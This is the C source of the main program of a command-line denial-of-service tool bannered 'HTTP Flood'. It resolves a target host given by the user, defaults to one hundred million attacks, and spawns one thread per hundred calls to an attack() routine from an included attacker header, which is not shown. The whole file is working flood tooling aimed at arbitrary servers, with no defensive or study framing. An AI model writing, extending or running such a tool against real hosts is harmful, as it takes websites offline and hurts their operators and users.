#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pthread.h>

#include "attacker/attacker.h"

#define ATTACKS_PER_THREAD 100


// struct that contains values to be used in thread function (run_100_attacks)
struct thread_args {
    char *host;
    char *ip;
    int16_t port;
};


// Prints the banner of the tool
void print_banner(void) {
    printf( "= = = = = = = = = = = = = = = = = = = =\n"
            "              HTTP Flood               \n"
            "= = = = = = = = = = = = = = = = = = = =\n");
}


// Prints the help string
void print_help(void) {
    printf("Usage: http-flood <host> [port] [number of attacks]\n"); // TODO improve help string
}


// Thread function that runs 100 attack
void *run_100_attacks(void *args) {
    size_t i;
    struct thread_args *t_args;

    t_args = (struct thread_args *) args;
    for (i = 0; i < ATTACKS_PER_THREAD; i++) {
        attack(t_args->host, t_args->ip, t_args->port);
    }
}


int main(int argc, char *argv[]) {
    char *host, *ip;
    int port, host_length;
    size_t i, num_attacks;

    struct hostent *host_entry;

    struct thread_args t_args;
    pthread_t t_id;
    pthread_t *all_threads_id; // array containing the threads
    size_t num_threads;

    // default values
    port = 80;
    num_attacks = 100000000;

    // if user doens't specifies host
    if (argc <= 1) {
        print_help();
        exit(1);
    }

    host = argv[1];
    host_length = strlen(host);

    if (argc > 2) {
        port = atoi(argv[2]);
    }
    if (argc > 3) {
        num_attacks = atoll(argv[3]);
    }
    if (num_attacks < 100) {
        printf("amount of attacks must be at least 100\n");
        exit(1);
    }

    // set the amount of threads after setting the amount of attacks
    num_threads = num_attacks / ATTACKS_PER_THREAD;
    all_threads_id = (pthread_t *) malloc(num_threads * sizeof(pthread_t));

    // get ip from host_entry converting array of address in to in_addr and the 
    // converting to ascii (inet_ntoa)
    host_entry = gethostbyname(host);
    if (host_entry == NULL) {
        printf("Invalid host!\n");
        exit(1);
    }
    ip = inet_ntoa(*((struct in_addr*) host_entry->h_addr_list[0]));

    print_banner();
    printf("host: %s\nip: %s\nport: %d\nNumber of attacks: %ld\n",
        host, ip, port, num_attacks);

    printf("attacking...\n");
    usleep(1500 * 1000); // wait 1500 milliseconds to run

    // set up thread_args
    t_args.host = host;
    t_args.ip = ip;
    t_args.port = port;

    // run the threads
    for (i = 0; i < num_threads; i++) {
        printf("running thread: %ld\n", i+1);

        pthread_create(&t_id, NULL, run_100_attacks, (void *) &t_args);
        all_threads_id[i] = t_id; // append the thread id
        usleep(10 * 1000); // wait 10 milliseconds to run the next thread
    }

    // wait for threads to finish
    for (i = 0; i < num_threads; i++) {
        t_id = all_threads_id[i];
        pthread_join(t_id, NULL);
    }

    free((void *) all_threads_id);
    return 0;
}
